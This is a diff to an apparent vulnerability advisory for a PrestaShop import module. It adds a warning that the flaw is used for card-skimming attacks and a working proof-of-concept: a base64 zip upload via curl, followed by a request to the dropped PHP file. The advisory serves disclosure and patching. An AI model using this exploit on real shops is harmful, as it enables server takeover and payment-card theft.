@@ -32,6 +32,8 @@ The method `Send::__construct()` allows the upload of .zip files, which can be a
 
 Note : The author has moved its exposed ajax script which suffers a critical issue to the front controller under an unpredictable token. It remains a critical vulnerability issue with a CVSS 3.1 score [9.1/10](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
 
+**Edit 2024-07-09 - WARNING** : This exploit is actively used to deploy webskimmer to massively steal credit cards. Since POC is now exploited, it is considered public.
+
 ## CVSS base metrics
 
 * **Attack vector**: network
@@ -50,6 +52,12 @@ Note : The author has moved its exposed ajax script which suffers a critical iss
 * Obtain admin access
 * Remove data from the associated PrestaShop
 * Steal data
+
+## Proof of concept
+
+```bash
+echo 'UEsDBBQAAAAIACmivFa0Sii9DgAAAA4AAAAJAAAALmh0YWNjZXNzS8zJyS9XSCvKz1UAMgFQSwMEFAAAAAgAoqG8Vp+ixh8WAAAAFAAAAAUAAABhLnBocLOxL8go4OVKTc7IV9AwMtQ2MtS0BgBQSwECHwAUAAAACAAporxWtEoovQ4AAAAOAAAACQAkAAAAAAAAACAAAAAAAAAALmh0YWNjZXNzCgAgAAAAAAABABgA59XXo5CR2QHn1dejkJHZAeJTwpqQkdkBUEsBAh8AFAAAAAgAoqG8Vp+ixh8WAAAAFAAAAAUAJAAAAAAAAAAgAAAANQAAAGEucGhwCgAgAAAAAAABABgA07RBDJCR2QHTtEEMkJHZAaRqZqCOkdkBUEsFBgAAAAACAAIAsgAAAG4AAAAAAA==' > tmp && base64 -d tmp > test.zip && curl -v -F "file=@test.zip" 'https://preprod.X/modules/simpleimportproduct/classes/send.php?zip_file=1&ajax=1&stepTwo=1&import_settings_name=1' && curl -v 'https://preprod.X/modules/simpleimportproduct/data/zip_files/a.php'
+```
 
 ## Other recommendations
 
